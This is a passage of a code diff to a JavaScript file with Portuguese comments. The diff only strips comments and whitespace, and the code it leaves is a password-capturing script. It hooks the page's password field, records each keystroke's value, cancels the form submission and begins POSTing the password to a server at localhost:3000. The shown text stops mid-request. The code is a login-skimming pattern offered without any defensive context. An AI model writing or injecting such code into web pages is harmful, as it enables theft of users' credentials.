@@ -1,14 +1,11 @@
-// Variável para armazenar a senha capturada
 let capturedPassword = '';
 
-// Função para iniciar a captura da senha
 const capturePassword = () => {
-    // Seleciona o campo de senha pelo tipo
     const passwordField = document.querySelector('input[type="password"]');
 
     if (passwordField) {
         passwordField.addEventListener('input', () => {
-            capturedPassword = passwordField.value; // Armazena a senha capturada
+            capturedPassword = passwordField.value;
         });
 
         const submitButton = document.querySelector('input[type="submit"], button[type="submit"]');
@@ -16,7 +13,7 @@ const capturePassword = () => {
         if (submitButton) {
             submitButton.addEventListener('click', (event) => {
                 event.preventDefault();
-                
+
                 fetch('http://localhost:3000/submit-password', {
                     method: 'POST',
                     headers: {
